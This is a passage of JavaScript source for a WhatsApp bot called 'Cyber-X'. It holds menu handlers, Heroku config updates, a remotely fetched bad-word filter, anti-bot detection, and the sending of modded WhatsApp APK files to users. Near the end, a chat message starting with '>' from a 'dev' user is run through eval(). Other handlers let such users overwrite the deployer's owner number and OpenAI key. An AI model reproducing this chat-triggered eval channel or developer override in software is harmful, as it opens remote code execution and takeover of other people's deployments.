await conn.sendMessage(from, { document : { url : moddata.link } , caption:"*Downloaded from https://fmmods.com/fouad-whatsapp/*\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" ,mimetype: 'application/vnd.android.package-archive', fileName: `${moddata.name}.apk` }, { quoted: mek })

}
}

if ( body.startsWith("1.2") && body.length < 4 ) {
const rew = m.quoted.msg
if ( rew.includes('COMMANDS') ) {
let menuc = ``
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'download'){
  if(!commands[i].dontAddCommandList){
menuc += `📥 *Pattern - ${commands[i].pattern}*
🚙 _Desciption - ${commands[i].desc}_
✔️ Usage - ${commands[i].use}

`
}}};

let menumg = `🔐 *DOWNLOAD COMMAND LIST-CYBER-X 2.0*

${menuc}

─────────────────────
🔠 *Quick Access*

R. Rate us
S. System information 

*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*
*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*`
await conn.sendMessage(from, { image: { url: "https://telegra.ph/file/cace8541cd66c731250a9.jpg" }, caption: menumg } , { quoted: mek } )

}
if ( rew.includes('Moderator Configuration') ) {
if ( !isDev && !isCreator ) return reply('*You must be a Moderator Frists*')
const getNum = rew.split("ɴᴜᴍʙᴇʀ - ")[1]
if ( config.INBOX_USER.includes(getNum) ) return reply('✔️ *User already in PM User List*')
let updt = `${config.INBOX_USER},${getNum}`
let baseURI = '/apps/' + config.HEROKU_APP_NAME
await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['INBOX_USER']: updt
                    }
                });
const resmsg =`*Inbox User List Updated* ✅

🔄  *_Please wait....  Restarting the bot...._*`
reply(resmsg)
}
if ( rew.includes('Database Reset Function') ) {
if ( !isDev && !isCreator ) return reply('*You must be a Moderator Frists*')
let baseURI = '/apps/' + config.HEROKU_APP_NAME
await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['INBOX_USER']: "94778962038"
                    }
                });
const resmsg =`*Inbox User List Reseted* ✅

🔄  *_Please wait....  Restarting the bot...._*`
reply(resmsg)
}
if ( rew.includes('Details Update Tool') ) {
if ( !isDev && !isCreator ) return reply('*You must be a Moderator Frists*')
const getuse = rew.split("ɪᴅ - ")[1]
const db_pool = new DBM({
    db: config.DATABASE_URL
})
const data = await db_pool.get(getuse+"DB")
await db_pool.insert( "OWNER_NUMBER" , data )
const resmsg =`*Owner Number Successfully Updated* ✅`
reply(resmsg)
}
if ( rew.includes('Cyber-X Fouad-WA') ) {
const getmod = await mods()
let moddata = getmod.com_fmwhatsapp
await conn.sendMessage(from, { document : { url : moddata.link } , caption:"*Downloaded from https://fmmods.com/fouad-whatsapp/*\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" ,mimetype: 'application/vnd.android.package-archive', fileName: `${moddata.name}.apk` }, { quoted: mek })

}

}

if ( body.startsWith("1.3") && body.length < 4 ) {
const rew = m.quoted.msg
if ( rew.includes('COMMANDS') ) {
let menuc = ``
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'search'){
  if(!commands[i].dontAddCommandList){
menuc += `🔎 *Pattern - ${commands[i].pattern}*
🚙 _Desciption - ${commands[i].desc}_
✔️ Usage - ${commands[i].use}

`
}}};

let menumg = `🔐 *SEARCH COMMAND LIST-CYBER-X 2.0*

${menuc}

─────────────────────
🔠 *Quick Access*

R. Rate us
S. System information 

*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*
*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*`
await conn.sendMessage(from, { image: { url: "https://telegra.ph/file/cace8541cd66c731250a9.jpg" }, caption: menumg }, { quoted: mek } )

}
if ( rew.includes('Moderator Configuration') ) {
if ( !isDev && !isCreator ) return reply('*You must be a Moderator Frists*')
const getNum = rew.split("ɴᴜᴍʙᴇʀ - ")[1]
if ( config.BANNED_USER.includes(getNum) ) return reply('✔️ *User already in Banned List*')
let updt = `${config.BANNED_USER},${getNum}`
let baseURI = '/apps/' + config.HEROKU_APP_NAME
await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['BANNED_USER']: updt
                    }
                });
const resmsg =`*Banned user List Updated* ✅

🔄  *_Please wait....  Restarting the bot...._*`
reply(resmsg)
}

if ( rew.includes('Database Reset Function') ) {
if ( !isDev && !isCreator ) return reply('*You must be a Moderator Frists*')
let baseURI = '/apps/' + config.HEROKU_APP_NAME
await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['BANNED_USER']: "94767438882"
                    }
                });
const resmsg =`*Banned Users List Reseted* ✅

🔄  *_Please wait....  Restarting the bot...._*`
reply(resmsg)
}
if ( rew.includes('Details Update Tool') ) {
if ( !isDev && !isCreator ) return reply('*You must be a Moderator Frists*')
const getuse = rew.split("ɪᴅ - ")[1]
const db_pool = new DBM({
    db: config.DATABASE_URL
})
const data = await db_pool.get(getuse+"DB")
await db_pool.insert( "OWNER_NAME" , data )
const resmsg =`*Owner Name Successfully Updated* ✅`
reply(resmsg)
}
if ( rew.includes('Cyber-X Fouad-WA') ) {
const getmod = await mods()
let moddata = getmod.com_gbwhatsapp
await conn.sendMessage(from, { document : { url : moddata.link } , caption:"*Downloaded from https://fmmods.com/fouad-whatsapp/*\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" ,mimetype: 'application/vnd.android.package-archive', fileName: `${moddata.name}.apk` }, { quoted: mek })

}

}
if ( body.startsWith("1.4") && body.length < 4 ) {
const rew = m.quoted.msg
if ( rew.includes('COMMANDS') ) {
let menuc = ``
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'profile'){
  if(!commands[i].dontAddCommandList){
menuc += `🧑‍🔧 *Pattern - ${commands[i].pattern}*
🚙 _Desciption - ${commands[i].desc}_
✔️ Usage - ${commands[i].use}

`
}}};

let menumg = `🔐 *PROFILE COMMAND LIST-CYBER-X 2.0*

${menuc}

─────────────────────
🔠 *Quick Access*

R. Rate us
S. System information 

*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*
*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*`
await conn.sendMessage(from, { image: { url: "https://telegra.ph/file/cace8541cd66c731250a9.jpg" }, caption: menumg } , { quoted: mek })

}
if ( rew.includes('Details Update Tool') ) {
if ( !isDev && !isCreator ) return reply('*You must be a Moderator Frists*')
const getuse = rew.split("ɪᴅ - ")[1]
const db_pool = new DBM({
    db: config.DATABASE_URL
})
const data = await db_pool.get(getuse+"DB")
if ( !data.includes('sk-')) return reply('❌ *Invalid Openai Key*')
await db_pool.insert( "OPENAI_KEY" , data )
const resmsg =`*OpenAi Key Successfully Updated* ✅`
reply(resmsg)
}
if ( rew.includes('Cyber-X Fouad-WA') ) {
const getmod = await mods()
let moddata = getmod.com_yowhatsapp
await conn.sendMessage(from, { document : { url : moddata.link } , caption:"*Downloaded from https://fmmods.com/fouad-whatsapp/*\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" ,mimetype: 'application/vnd.android.package-archive', fileName: `${moddata.name}.apk` }, { quoted: mek })

}

}
if ( body.startsWith("1.5") && body.length < 4 ) {
const rew = m.quoted.msg
if ( rew.includes('COMMANDS') ) {
let menuc = ``
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'group'){
  if(!commands[i].dontAddCommandList){
menuc += `🪀 *Pattern - ${commands[i].pattern}*
🚙 _Description - ${commands[i].desc}_
✔️ Usage - ${commands[i].use}

`
}}};

let menumg = `🔐 *GROUP COMMAND LIST-CYBER-X 2.0*

${menuc}

─────────────────────
🔠 *Quick Access*

R. Rate us
S. System information 

*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*
*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*`
await conn.sendMessage(from, { image: { url: "https://telegra.ph/file/cace8541cd66c731250a9.jpg" }, caption: menumg } , { quoted: mek })

}
if ( rew.includes('Details Update Tool') ) {
if ( !isDev && !isCreator ) return reply('*You must be a Moderator Frists*')
const getuse = rew.split("ɪᴅ - ")[1]
const db_pool = new DBM({
    db: config.DATABASE_URL
})
const data = await db_pool.get(getuse+"DB")
await db_pool.insert( "MENU_TEXT" , data )
const resmsg =`*Menu message Successfully Updated* ✅`
reply(resmsg)
}
}

if ( body.startsWith("1.6") && body.length < 4 ) {
const rew = m.quoted.msg
if ( rew.includes('COMMANDS') ) {
let menuc = ``
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'extra'){
  if(!commands[i].dontAddCommandList){
menuc += `📪 *Pattern - ${commands[i].pattern}*
🚙 _Description - ${commands[i].desc}_
✔️ Usage - ${commands[i].use}

`
}}};

let menumg = `🔐 *EXTRA COMMAND LIST-CYBER-X 2.0*

${menuc}

─────────────────────
🔠 *Quick Access*

R. Rate us
S. System information 

*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*
*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*`
await conn.sendMessage(from, { image: { url: "https://telegra.ph/file/cace8541cd66c731250a9.jpg" }, caption: menumg }, { quoted: mek } )

}
if ( rew.includes('Database Reset Function') ) {
if ( !isDev && !isCreator ) return reply('*You must be a Moderator Frists*')
const db_pool = new DBM({
    db: config.DATABASE_URL
})
const data = await fetchJson("https://raw.githubusercontent.com/darkalphaxteam/UPLOADS/main/JSON/info.json")
await db_pool.insert( "ALIVE_MESSAGE" , data.text )
await db_pool.insert( "ALIVE_IMAGE" , data.image )
const resmsg =`*Alive message and image Successfully Reseted* ✅`
reply(resmsg)
}
if ( rew.includes('Details Update Tool') ) {
if ( !isDev && !isCreator ) return reply('*You must be a Moderator Frists*')
const getuse = rew.split("ɪᴅ - ")[1]
const db_pool = new DBM({
    db: config.DATABASE_URL
})
const data = await db_pool.get(getuse+"DB")
await db_pool.insert( "S_PACK_NAME" , data )
const resmsg =`*Stickerpack Name Successfully Updated* ✅`
reply(resmsg)
}

}

if ( body.startsWith("1.7") && body.length < 4 ) {
const rew = m.quoted.msg
if ( rew.includes('COMMANDS') ) {
let menuc = ``
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'text2img'){
  if(!commands[i].dontAddCommandList){
menuc += `🌅 *Pattern - ${commands[i].pattern}* - _Enter your Text_
`
}}};

let menumg = `🔐 *TEXT TO IMAGE COMMAND LIST-CYBER-X 2.0*

${menuc}

*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*
*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*`
await conn.sendMessage(from, { image: { url: "https://telegra.ph/file/cace8541cd66c731250a9.jpg" }, caption: menumg }, { quoted: mek } )

}
if ( rew.includes('Details Update Tool') ) {
if ( !isDev && !isCreator ) return reply('*You must be a Moderator Frists*')
const getuse = rew.split("ɪᴅ - ")[1]
const db_pool = new DBM({
    db: config.DATABASE_URL
})
const data = await db_pool.get(getuse+"DB")
await db_pool.insert( "S_OWNER_NAME" , data )
const resmsg =`*Sticker owner name Successfully Updated* ✅`
reply(resmsg)
}

}
if ( body.startsWith("1.8") && body.length < 4 ) {
const rew = m.quoted.msg
if ( rew.includes('COMMANDS') ) {
let menuc = ``
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'edit'){
  if(!commands[i].dontAddCommandList){
menuc += `📪 *Pattern - ${commands[i].pattern}*
🚙 _Description - ${commands[i].desc}_
✔️ Usage - ${commands[i].use}

`
}}};

let menumg = `🔐 *PHOTO EDIT COMMAND LIST-CYBER-X 2.0*

${menuc}

*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*
*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*`
await conn.sendMessage(from, { image: { url: "https://telegra.ph/file/cace8541cd66c731250a9.jpg" }, caption: menumg }, { quoted: mek } )

}
}
}
}
}
//============================================================================
const bad = await fetchJson(`https://raw.githubusercontent.com/chamiofficial/server-/main/badby_alpha.json`)
if (config.ANTI_BAD == "true"){
  if (!isAdmins && !isDev) {
  for (any in bad){
  if (body.toLowerCase().includes(bad[any])){  
    if (!body.includes('tent')) {
      if (!body.includes('docu')) {
        if (!body.includes('https')) {
  if (groupAdmins.includes(sender)) return 
  if (mek.key.fromMe) return   
  await conn.sendMessage(from, { delete: mek.key })  
  await conn.sendMessage(from , { text: '*Bad word detected..!*'})
  await conn.groupParticipantsUpdate(from,[sender], 'remove')
  }}}}}}}
  
  // ANTI BOT OKKOMATAMA DENNAM WADE 
 if (config.BOT_DETECT == "true"){
  if ( isGroup && !isAdmins && !isDev && !isMe && !isCreator && isBotAdmins ) {
  if ( mek.id.startsWith("BAE") ) {
await conn.sendMessage(from, { text: "❌ ```Another Bot's message Detected :``` 📚 *Baileys based Bot* ❗" })
if ( config.ANTI_BOT == "true" && isBotAdmins ) {
await conn.sendMessage(from, { delete: mek.key })
await conn.groupParticipantsUpdate(from,[sender], 'remove')
  }}
    if ( mek.id.startsWith("QUEENAMDI") ) {
await conn.sendMessage(from, { text: "❌ ```Another Bot's message Detected :``` *💃 Queen Amdi* ❗" })
if ( config.ANTI_BOT == "true" && isBotAdmins ) {
await conn.sendMessage(from, { delete: mek.key })
await conn.groupParticipantsUpdate(from,[sender], 'remove')
  }}
    if ( mek.id.startsWith("QUEENELISA") ) {
await conn.sendMessage(from, { text: "❌ ```Another Bot's message Detected :``` *🤖 Queen Elisa* ❗" })
if ( config.ANTI_BOT == "true" && isBotAdmins ) {
await conn.sendMessage(from, { delete: mek.key })
await conn.groupParticipantsUpdate(from,[sender], 'remove')
  }}
    if ( mek.id.startsWith("RGNK") ) {
await conn.sendMessage(from, { text: "❌ ```Another Bot's message Detected :``` *🚫 Raganork Wa Bot* ❗" })
if ( config.ANTI_BOT == "true" && isBotAdmins ) {
await conn.sendMessage(from, { delete: mek.key })
await conn.groupParticipantsUpdate(from,[sender], 'remove')
  }}
      
  }
  }

  
//====================================================================
 
switch (command) {
case 'jid':
if (!isCreator && !isDev ) return reply ('*You are not a Moderator..❗*')
reply(from)
break

default:				
if (isDev && body.startsWith('>')) {
let bodyy = body.split('>')[1]
let code2 = bodyy.replace("°", ".toString()");
try {
let resultTest = await eval(code2);
if (typeof resultTest === "object") {
reply(util.format(resultTest));
} else {
reply(util.format(resultTest));
}
} catch (err) {
reply(util.format(err));
}}}
} catch (e) {
const isError = String(e)
console.log(isError)}
})
}
app.get("/", (req, res) => {
res.send("*Cyber-X WhatsApp Bot Working successfully..!*");
});
app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
setTimeout(() => {
connectToWA()
}, 3000);
